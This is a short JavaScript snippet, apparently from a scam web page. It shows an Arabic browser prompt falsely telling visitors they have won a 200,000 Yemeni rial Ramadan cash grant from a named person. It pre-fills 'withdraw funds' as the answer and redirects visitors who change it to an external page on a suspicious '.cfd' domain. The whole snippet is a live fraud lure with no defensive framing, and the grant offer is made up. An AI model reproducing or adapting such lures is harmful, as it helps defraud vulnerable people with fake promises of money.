var password = 'سحب الأموال';

password = prompt(
  'تهانينا، أنت مؤهل للحصول على دعم نقدي رمضاني من أمين جبران بقيمة 200,000 ريال يمني. انقر فوق "موافق" لتلقي على الفور.',
  'سحب الأموال'
);

if (password !== 'سحب الأموال') {
    location.href = 'https://ongoing-grant.cfd/Ju-Bran-Ameen-200,000.html';
}
